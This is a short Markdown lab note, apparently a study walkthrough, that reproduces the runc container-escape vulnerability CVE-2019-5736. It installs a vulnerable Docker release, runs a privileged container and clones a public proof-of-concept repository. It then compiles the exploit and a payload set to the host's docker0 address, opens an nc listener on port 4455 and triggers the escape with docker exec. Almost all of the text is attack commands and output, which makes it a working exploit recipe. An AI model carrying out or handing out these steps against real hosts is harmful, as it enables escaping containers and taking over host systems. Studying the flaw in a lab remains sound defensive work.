
# Docker Compromise

* https://www.youtube.com/watch?v=gjvsbcAlQl8

```bash
$ sudo apt-get update
$ sudo apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg2 \
    software-properties-common
$ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
$ sudo apt-key fingerprint 0EBFCD88
$ sudo add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/debian \
   $(lsb_release -cs) \
   stable"
$ sudo apt-get update
$ apt-cache madison docker-ce
$ sudo apt-get install docker-ce=18.03.1~ce-0~debian
```

```bash
$ docker run -it --privileged --name poc lbelmarletelier/debian9 /bin/bash
$ git clone https://github.com/feexd/pocs.git
$ cd pocs/CVE-2019-5736/
```

```bash
# host
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 56:7f:92:fd:e0:9a brd ff:ff:ff:ff:ff:ff
    inet 209.97.140.161/20 brd 209.97.143.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.16.0.6/16 brd 10.16.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::547f:92ff:fefd:e09a/64 scope link
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c3:d2:bb:45 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:c3ff:fed2:bb45/64 scope link
       valid_lft forever preferred_lft forever
5: veth5ab0e14@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
    link/ether 3a:29:4f:0e:e5:91 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::3829:4fff:fe0e:e591/64 scope link
       valid_lft forever preferred_lft forever
# Copy docker ip: 172.17.0.1
```

```bash
# container
$ vi payload.c
# Set # Define port to ip (e.g. 172.17.0.1)
$ make
gcc -s exploit.c -o exploit -Wall
gcc -s payload.c -o payload -Wall
```

```bash
# host
$ nc -nlvvp 4455
```

```bash
# container
$ ./pwn.sh
starting exploit
```

```bash
# host
$ docker exec -it poc /bin/sh
```